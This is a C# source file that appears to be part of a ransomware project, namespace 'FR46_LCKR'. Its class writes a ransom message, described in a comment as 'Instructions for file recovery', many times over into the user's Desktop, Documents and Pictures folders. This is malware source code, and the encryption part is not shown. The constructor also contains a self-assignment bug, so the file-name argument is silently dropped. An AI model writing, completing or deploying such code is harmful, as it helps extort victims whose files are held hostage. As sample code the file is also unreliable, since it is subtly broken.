using System;
using System.IO;

namespace FR46_LCKR.CLASS
{
    internal class Motd_Wrtr
    {
        private string MOTD {get;}
        private string Fil_Name { get; }
        private int MOTD_Countr { get; }

        // Function for Instructions for file recovery

        public Motd_Wrtr(string motd, string fil_Name, int motd_Countr)
        {
            MOTD = motd;
            Fil_Name = Fil_Name;
            MOTD_Countr = motd_Countr;
        }

        // Writes message to Desktop,Documents,Pictures,

        public void WMOTD_Desktop()
        {
            var foldr_Path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            WMOTD(foldr_Path, MOTD, MOTD_Countr, Fil_Name);
        }

        public void WMOTD_Documents()
        {
            var foldr_Path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            WMOTD(foldr_Path, MOTD, MOTD_Countr, Fil_Name);
        }

        public void WMOTD_Pictures()
        {
            var foldr_Path = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
            WMOTD(foldr_Path, MOTD, MOTD_Countr, Fil_Name);
        }

        private void WMOTD(string foldr_Path, string motd, int motd_Countr, string fil_Name)
        {
            StreamWriter sw;
            FileStream fs;
            for (int i = 0; i < motd_Countr; i++)
            {
                var fname = $"{fil_Name} {i} .txt";
                var fPath = Path.Combine(foldr_Path, fname);

                using (fs = new FileStream(fPath, FileMode.OpenOrCreate))
                {
                    using (sw = new StreamWriter(fs))
                    {
                        sw.WriteLine(motd);
                    }
                }
            }
        }
    }
}
